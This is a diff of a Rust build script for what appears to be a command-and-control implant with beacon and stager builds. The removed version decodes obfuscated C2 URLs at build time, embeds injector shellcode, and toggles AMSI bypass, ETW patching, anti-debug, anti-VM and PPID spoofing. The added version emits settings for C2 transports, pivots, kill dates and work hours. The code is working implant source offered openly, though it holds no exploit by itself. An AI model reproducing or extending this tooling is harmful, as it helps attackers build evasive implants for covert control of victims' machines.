@@ -1,314 +1,67 @@
-//! Build-time configuration generator.
-//!
-//! Reads every `TC2_*` environment variable the builder emits and
-//! writes them as `pub const` items into `config_generated.rs`.
-//! `src/lib.rs` `include!`s the result at the crate root, and
-//! `src/config.rs` re-exports each const under a stable name.
-//!
-//! # Two kinds of variable
-//!
-//! - **Plain variables.** `TC2_KILL_DAYS=30` becomes
-//!   `pub const KILL_DAYS: i32 = 30;`.
-//!
-//! - **Obfuscated variables.** The builder XORs the payload with a
-//!   per-build 16-byte key (`TC2_OBF_KEY_HEX`) and base64-encodes
-//!   the result. `TC2_DEFAULT_URL`, `TC2_PROFILE_JSON`,
-//!   `TC2_WEBSOCKET_URL`, `TC2_ICMP_HOST`, `TC2_DOH_RESOLVER`,
-//!   `TC2_DOH_HOST_HEADER`, `TC2_DOH_USER_AGENT`, and (in stager
-//!   builds) `TC2_STAGE_NAME` are in this class. This build script
-//!   de-obfuscates them at build time so the runtime consts hold
-//!   the plaintext. The XOR key is only present in the build
-//!   environment; it is not embedded in the binary.
-//!
-//!   The Go tree de-obfuscated at runtime, which kept the key in
-//!   the binary next to the ciphertext. That provides no real
-//!   confidentiality — a `strings` + XOR exercise recovers the
-//!   plaintext either way — so we do it at build time and drop the
-//!   key entirely. The property that matters (the URL is baked in
-//!   at compile time and cannot be changed by editing a config
-//!   file on disk) is preserved.
-//!
-//! - **Binary blobs.** `TC2_INJECTOR_SHELLCODE_PATH` points at a
-//!   file on disk. The file is copied to `OUT_DIR` and embedded via
-//!   `include_bytes!`, so the shellcode lives inside the binary.
-//!
-//! # Defaults
-//!
-//! Every const is emitted unconditionally, with an empty or zero
-//! default when the env var is absent. This makes `cargo build`
-//! (no `--bin`) work when both `beacon` and `stager` are compiled
-//! in one invocation, and makes `#[cfg(target_bin = "...")]`-free
-//! code in `src/config.rs` possible — every re-export resolves
-//! regardless of which bin is being built.
-//!
-//! # Cargo rerun triggers
-//!
-//! `cargo:rerun-if-env-changed` is emitted for every `TC2_*` var
-//! seen at build.rs execution time, plus the injector shellcode
-//! path. Adding a var to the builder without adding it here means
-//! changes to it don't rebuild the crate — the const keeps its
-//! previous value until something else forces a rebuild.
+// build.rs — reads every TC2_* environment variable the builder emits
+// and writes config_generated.rs into OUT_DIR.
+//
+// src/config.rs does:
+//     include!(concat!(env!("OUT_DIR"), "/config_generated.rs"));
+//
+// so every TC2_* const is available as a module-level identifier.
 
 use std::env;
 use std::fs;
 use std::path::PathBuf;
 
-use base64::Engine as _;
-
 fn main() {
-    let out = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR"));
+    let out = PathBuf::from(env::var("OUT_DIR").unwrap());
+    let mut out_src = String::new();
 
-    // Every TC2_* var must trigger a rebuild when it changes.
-    for (k, _) in env::vars().filter(|(k, _)| k.starts_with("TC2_")) {
-        println!("cargo:rerun-if-env-changed={k}");
-    }
-    println!("cargo:rerun-if-env-changed=TC2_INJECTOR_SHELLCODE_PATH");
+    let vars: &[(&str, &str)] = &[
+        ("TC2_URL",                      ""),
+        ("TC2_SLEEP",                    "60"),
+        ("TC2_JITTER",                   "0.3"),
+        ("TC2_KILL_DAYS",                "30"),
+        ("TC2_WORK_START",               "08:00"),
+        ("TC2_WORK_END",                 "19:00"),
+        ("TC2_C2_PROFILE",               ""),
+        ("TC2_TLS_PROFILE",              "rustls"),
+        ("TC2_TRANSPORT",                "http"),
+        ("TC2_TRANSPORT_FAILOVER_AFTER", "3"),
+        ("TC2_AGENT_SIGNING_KEY",        ""),
+        ("TC2_AGENT_PUBKEY",             ""),
+        ("TC2_SERVER_ECDH_PUBKEY",       ""),
+        ("TC2_IDENTITY_ROLE",            ""),
+        ("TC2_MTLS_CERT",                ""),
+        ("TC2_MTLS_KEY",                 ""),
+        ("TC2_MTLS_CA",                  ""),
+        ("TC2_DNS_DOMAIN",               ""),
+        ("TC2_DOH_RESOLVER",             ""),
+        ("TC2_ICMP_HOST",                ""),
+        ("TC2_WG_SERVER_PUBKEY",         ""),
+        ("TC2_WG_SERVER_ADDR",           ""),
+        ("TC2_WG_AGENT_PRIVKEY",         ""),
+        ("TC2_WG_TUNNEL_IP",             ""),
+        ("TC2_WG_SERVER_TUNNEL_IP",      "10.99.0.1"),
+        ("TC2_WG_INNER_PORT",            "8881"),
+        ("TC2_PIVOT_KEY",                ""),
+        ("TC2_SMB_PIPE",                 ""),
+        ("TC2_SMB_RELAY_PIPE",           ""),
+        ("TC2_TCP_BIND_ADDR",            ""),
+        ("TC2_TCP_BIND_TOKEN",           ""),
+        ("TC2_TCP_RELAY_TARGET",         ""),
+        ("TC2_TCP_RELAY_TOKEN",          ""),
+        ("TC2_TCP_REV_LISTEN",           ""),
+        ("TC2_TCP_REV_TARGET",           ""),
+        ("TC2_TCP_REV_TOKEN",            ""),
+        ("TC2_SLEEP_MASK",               "none"),
+        ("TC2_SYSCALL_METHOD",           "default"),
+        ("TC2_VERBOSE",                  "0"),
+    ];
 
-    let mut gen = String::new();
-    gen.push_str(
-        "// @generated by build.rs — do not edit.\n\
-         // The consts below are derived from the TC2_* environment\n\
-         // variables the builder set. Re-run `cargo build` to\n\
-         // regenerate; the values are not present in source control.\n\
-         #![allow(clippy::all)]\n\n",
-    );
-
-    // ----- Obfuscation key ----------------------------------------
-    //
-    // The builder always sets TC2_OBF_KEY_HEX — even when every
-    // obfuscated var is empty, the key exists so the deobf() calls
-    // below are total. A missing key (hand-run cargo build with no
-    // TC2_* set at all) becomes a zero key, which is the identity
-    // function; that path is only reachable during local development
-    // where the defaults are what matter.
-    let obf_key = match env::var("TC2_OBF_KEY_HEX") {
-        Ok(hex_str) => hex::decode(&hex_str).unwrap_or_else(|_| vec![0u8; 16]),
-        Err(_) => vec![0u8; 16],
-    };
-    // Emit the key so a downstream consumer (e.g. an in-crate test
-    // that re-obfuscates) can reach it. Not required at runtime.
-    gen.push_str(&format!(
-        "pub const OBF_KEY: &[u8] = &{:?};\n\n",
-        obf_key
-    ));
-
-    // ----- De-obfuscation helper ----------------------------------
-    //
-    // base64-decode, XOR with the key (cycled), return UTF-8.
-    // Empty input → empty output. Malformed base64 → empty output
-    // plus a build warning, so a broken build pipeline is loud but
-    // not fatal (the beacon that reaches the target with an empty
-    // URL is broken in a way the operator will notice at first
-    // check-in; a build failure would be better but the builder's
-    // job is to make sure the env var is well-formed).
-    fn deobf(b64: &str, key: &[u8]) -> String {
-        if b64.is_empty() {
-            return String::new();
-        }
-        let raw = match base64::engine::general_purpose::STANDARD.decode(b64) {
-            Ok(r) => r,
-            Err(e) => {
-                println!("cargo:warning=deobf: bad base64: {e}");
-                return String::new();
-            }
-        };
-        let plain: Vec<u8> = if key.is_empty() {
-            raw
-        } else {
-            raw.iter()
-                .enumerate()
-                .map(|(i, b)| b ^ key[i % key.len()])
-                .collect()
-        };
-        String::from_utf8_lossy(&plain).into_owned()
+    for (name, default) in vars {
+        println!("cargo:rerun-if-env-changed={name}");
+        let v = env::var(name).unwrap_or_else(|_| (*default).to_string());
+        let escaped = v.replace('\\', "\\\\").replace('"', "\\\"");
+        out_src.push_str(&format!("pub const {name}: &str = \"{escaped}\";\n"));
     }
 
-    // ----- Emission macros ----------------------------------------
-
-    macro_rules! emit_str {
-        ($env:literal, $const_name:literal) => {
-            let v = env::var($env).unwrap_or_default();
-            gen.push_str(&format!(
-                "pub const {const_name}: &str = {v:?};\n",
-                v = v
-            ));
-        };
-    }
-
-    macro_rules! emit_deobf_str {
-        ($env:literal, $const_name:literal) => {
-            let raw = env::var($env).unwrap_or_default();
-            let plain = deobf(&raw, &obf_key);
-            gen.push_str(&format!(
-                "pub const {const_name}: &str = {plain:?};\n",
-                plain = plain
-            ));
-        };
-    }
-
-    macro_rules! emit_bool {
-        ($env:literal, $const_name:literal) => {
-            let b = env::var($env)
-                .map(|v| v == "true" || v == "1")
-                .unwrap_or(false);
-            gen.push_str(&format!(
-                "pub const {const_name}: bool = {b};\n"
-            ));
-        };
-    }
-
-    macro_rules! emit_int {
-        ($env:literal, $const_name:literal) => {
-            let n: i32 = env::var($env)
-                .ok()
-                .and_then(|v| v.parse().ok())
-                .unwrap_or(0);
-            gen.push_str(&format!(
-                "pub const {const_name}: i32 = {n};\n"
-            ));
-        };
-    }
-
-    // Hex-encoded byte arrays (agent signing key, stage key, pivot
-    // key halves). Emitted as `&[u8]` so the runtime decodes once,
-    // not on every use.
-    macro_rules! emit_hex_bytes {
-        ($env:literal, $const_name:literal) => {
-            let raw = env::var($env).unwrap_or_default();
-            let bytes = hex::decode(&raw).unwrap_or_default();
-            gen.push_str(&format!(
-                "pub const {const_name}: &[u8] = &{:?};\n",
-                bytes
-            ));
-        };
-    }
-
-    // Base64-encoded strings (PEM material, ECDH pubkeys,
-    // WireGuard keys). Emitted as the base64 string; the runtime
-    // decodes once at startup.
-    macro_rules! emit_b64_str {
-        ($env:literal, $const_name:literal) => {
-            let v = env::var($env).unwrap_or_default();
-            gen.push_str(&format!(
-                "pub const {const_name}_B64: &str = {v:?};\n",
-                v = v
-            ));
-        };
-    }
-
-    // ----- Section 1: Beacon-only, plain --------------------------
-
-    emit_str!("TC2_DEFAULT_PROFILE", "DEFAULT_PROFILE");
-    emit_int!("TC2_KILL_DAYS", "KILL_DAYS");
-    emit_str!("TC2_WORK_HOURS_START", "WORK_HOURS_START");
-    emit_str!("TC2_WORK_HOURS_END", "WORK_HOURS_END");
-    emit_str!("TC2_TLS_PROFILE", "TLS_PROFILE");
-    emit_bool!("TC2_VERBOSE", "VERBOSE");
-
-    emit_bool!("TC2_ANTISANDBOX", "ANTISANDBOX");
-    emit_bool!("TC2_AMSI_BYPASS", "AMSI_BYPASS");
-    emit_bool!("TC2_ETW_PATCH", "ETW_PATCH");
-    emit_bool!("TC2_SLEEP_MASK_ENABLED", "SLEEP_MASK_ENABLED");
-    emit_bool!("TC2_STRING_OBFUSCATION", "STRING_OBFUSCATION");
-    emit_bool!("TC2_PPID_SPOOF", "PPID_SPOOF");
-    emit_bool!("TC2_ANTIDEBUG", "ANTIDEBUG");
-    emit_bool!("TC2_ANTIVM", "ANTIVM");
-    emit_str!("TC2_SLEEP_MASK_TYPE", "SLEEP_MASK_TYPE");
-    emit_str!("TC2_SYSCALL_METHOD", "SYSCALL_METHOD");
-
-    emit_str!("TC2_IDENTITY_ROLE", "IDENTITY_ROLE");
-    emit_str!("TC2_TRANSPORT_MODE", "TRANSPORT_MODE");
-    // The builder emits a decimal integer here; the const is i32.
-    emit_int!("TC2_TRANSPORT_FAILOVER_AFTER", "TRANSPORT_FAILOVER_AFTER");
-    emit_str!("TC2_INJECT_METHOD_DEFAULT", "INJECT_METHOD_DEFAULT");
-
-    // ----- Section 2: Beacon-only, obfuscated ---------------------
-
-    emit_deobf_str!("TC2_DEFAULT_URL", "DEFAULT_URL");
-    emit_deobf_str!("TC2_PROFILE_JSON", "PROFILE_JSON");
-    emit_deobf_str!("TC2_WEBSOCKET_URL", "WEBSOCKET_URL");
-    emit_deobf_str!("TC2_ICMP_HOST", "ICMP_HOST");
-    emit_deobf_str!("TC2_DOH_RESOLVER", "DOH_RESOLVER");
-    emit_deobf_str!("TC2_DOH_HOST_HEADER", "DOH_HOST_HEADER");
-    emit_deobf_str!("TC2_DOH_USER_AGENT", "DOH_USER_AGENT");
-
-    // ----- Section 3: mTLS bundle (base64 PEM) --------------------
-
-    emit_b64_str!("TC2_SERVER_PUBKEY_PEM", "SERVER_PUBKEY_PEM");
-    emit_b64_str!("TC2_CLIENT_CERT_PEM", "CLIENT_CERT_PEM");
-    emit_b64_str!("TC2_CLIENT_KEY_PEM", "CLIENT_KEY_PEM");
-    emit_b64_str!("TC2_ROOT_CA_PEM", "ROOT_CA_PEM");
-    emit_b64_str!("TC2_AGENT_PRIV_KEY_PEM", "AGENT_PRIV_KEY_PEM");
-    emit_b64_str!("TC2_SERVER_ECDH_PUBKEY", "SERVER_ECDH_PUBKEY");
-
-    // ----- Section 4: WireGuard transport -------------------------
-
-    emit_str!("TC2_WIREGUARD_SERVER_PUBKEY", "WIREGUARD_SERVER_PUBKEY");
-    emit_str!("TC2_WIREGUARD_SERVER_ADDR", "WIREGUARD_SERVER_ADDR");
-    emit_str!("TC2_WIREGUARD_AGENT_PRIVKEY", "WIREGUARD_AGENT_PRIVKEY");
-    emit_str!("TC2_WIREGUARD_TUNNEL_IP", "WIREGUARD_TUNNEL_IP");
-    emit_str!("TC2_WIREGUARD_INNER_PORT", "WIREGUARD_INNER_PORT");
-    emit_str!(
-        "TC2_WIREGUARD_SERVER_TUNNEL_IP",
-        "WIREGUARD_SERVER_TUNNEL_IP"
-    );
-
-    // ----- Section 5: DNS and DoH --------------------------------
-
-    emit_str!("TC2_DNS_DOMAIN", "DNS_DOMAIN");
-    emit_str!("TC2_DNS_VERB_B", "DNS_VERB_B");
-    emit_str!("TC2_DNS_VERB_T", "DNS_VERB_T");
-    emit_str!("TC2_DNS_VERB_R", "DNS_VERB_R");
-    emit_int!("TC2_DNS_PAYLOAD_CHUNK_SIZE", "DNS_PAYLOAD_CHUNK_SIZE");
-    emit_str!("TC2_DNS_RESOLVER", "DNS_RESOLVER");
-
-    // ----- Section 6: Pivot transports ---------------------------
-
-    emit_str!("TC2_SMB_PIPE", "SMB_PIPE");
-    emit_str!("TC2_SMB_RELAY_PIPE", "SMB_RELAY_PIPE");
-    emit_str!("TC2_TCP_BIND_ADDR", "TCP_BIND_ADDR");
-    emit_str!("TC2_TCP_BIND_TOKEN", "TCP_BIND_TOKEN");
-    emit_str!("TC2_TCP_RELAY_TARGET", "TCP_RELAY_TARGET");
-    emit_str!("TC2_TCP_RELAY_TOKEN", "TCP_RELAY_TOKEN");
-    emit_str!("TC2_TCP_REV_LISTEN", "TCP_REV_LISTEN");
-    emit_str!("TC2_TCP_REV_TARGET", "TCP_REV_TARGET");
-    emit_str!("TC2_TCP_REV_TOKEN", "TCP_REV_TOKEN");
-    // Pivot key halves: base64 DER, decoded at startup.
-    emit_b64_str!("TC2_PIVOT_PRIV_KEY_B64", "PIVOT_PRIV_KEY");
-    emit_b64_str!("TC2_PIVOT_PUB_KEY_B64", "PIVOT_PUB_KEY");
-
-    // ----- Section 7: Stager-only --------------------------------
-
-    emit_deobf_str!("TC2_STAGE_NAME", "STAGE_NAME");
-    emit_hex_bytes!("TC2_STAGE_KEY_HEX", "STAGE_KEY");
-    // TC2_DEFAULT_SLEEP is an integer. Same shape as KILL_DAYS.
-    emit_int!("TC2_DEFAULT_SLEEP", "DEFAULT_SLEEP");
-
-    // ----- Section 8: Injector shellcode -------------------------
-    let injector = env::var("TC2_INJECTOR_SHELLCODE_PATH")
-        .unwrap_or_default();
-    if injector.is_empty() {
-        gen.push_str("pub const INJECTOR_SHELLCODE: &[u8] = &[];\n");
-    } else {
-        let bytes = fs::read(&injector)
-            .unwrap_or_else(|e| panic!("read injector shellcode {injector}: {e}"));
-        let dst = out.join("injector.bin");
-        fs::write(&dst, &bytes).expect("write injector.bin");
-        println!("cargo:rerun-if-changed={injector}");
-        gen.push_str(
-            "pub const INJECTOR_SHELLCODE: &[u8] = \
-             include_bytes!(concat!(env!(\"OUT_DIR\"), \"/injector.bin\"));\n",
-        );
-    }
-
-    // ----- Section 9: WASM extension host feature ----------------
-    let wasm_enabled = env::var("CARGO_FEATURE_WASM_HOST").is_ok();
-    gen.push_str(&format!(
-        "pub const WASM_HOST_ENABLED: bool = {wasm_enabled};\n"
-    ));
-
-    // ----- Write the file ----------------------------------------
-
-    fs::write(out.join("config_generated.rs"), gen)
-        .expect("write config_generated.rs");
+    fs::write(out.join("config_generated.rs"), out_src).unwrap();
 }
